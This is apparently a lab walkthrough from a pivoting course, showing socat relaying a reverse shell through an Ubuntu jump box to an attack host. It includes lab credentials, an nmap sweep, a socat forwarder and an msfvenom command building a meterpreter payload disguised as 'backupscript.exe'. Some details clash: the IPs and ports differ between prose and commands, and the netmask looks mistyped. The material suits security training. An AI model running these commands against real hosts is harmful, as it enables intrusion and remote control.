## Socat Redirection with a Reverse Shell

[Socat](https://linux.die.net/man/1/socat) is a bidirectional relay tool that can create pipe sockets between **2** independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start **socat** on the Ubuntu server. 


#### Jump box credentials 10.129.120.53 (ACADEMY-PIVOTING-LINUXPIV)

Username: ubuntu
Password: HTB_@cademy_stdnt!

### External and Internal Network IP's

![Ifconfig](/socat-reverse-shell/images/network.png) 

Internal IP: 172.16.5.129
Netmask: 225.225.254.0
Broadcast IP: 172.16.5.255

### Internal scanning for other hosts.

We can do a ping sweep on 172.16.5.0/23 to see if we can find any other alive hosts.

	$ ./nmap -v -sn 172.16.5.0/23 -oA nmap-ping-scan


![Nmap ping sweep](/socat-reverse-shell/images/nmap-ping-sweep.png) 

#### Alive internal hosts from ping scan

172.16.5.19
172.16.5.129

> - 172.16.5 129 is our ubuntu host so the only other host on the network is 172.16.5.19

From just doing a quick scan of the .19 host it appears to be a domain controller from the open ports

![Nmap ping sweep](/socat-reverse-shell/images/dc-host.png) 

### Starting Socat Listener


Socat will listen on localhost on port **5555** and forward all the traffic to port **9001** on our attack host (10.10.14.18). Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server. We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host's listener, where we would be getting a shell.

	$ socat TCP4-LISTEN:5555,FORK TCP4:10.10.15.168:9001


![Socat Lister](/socat-reverse-shell/images/socat-reverse-shell.png) 


### Creating the Windows Payload

	$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.5.129 lport=4444 -f exe -o backupscript.exe

Keep in mind that we must transfer this payload to the Windows host. We can use some of the same techniques used in previous sections to do so.


![Payload](/socat-reverse-shell/images/met-payload.png) 

### Configuring and Starting multi / handler


![Multi Handler](/socat-reverse-shell/images/multi-handler.png) 


We can test this by running our payload on the windows host again, and we should see a network connection from the Ubuntu server this time.

![Proxy](/socat-reverse-shell/images/socks-proxy.png) 

### Establishing the Meterpreter Session


![Root](/socat-reverse-shell/images/root.png) 
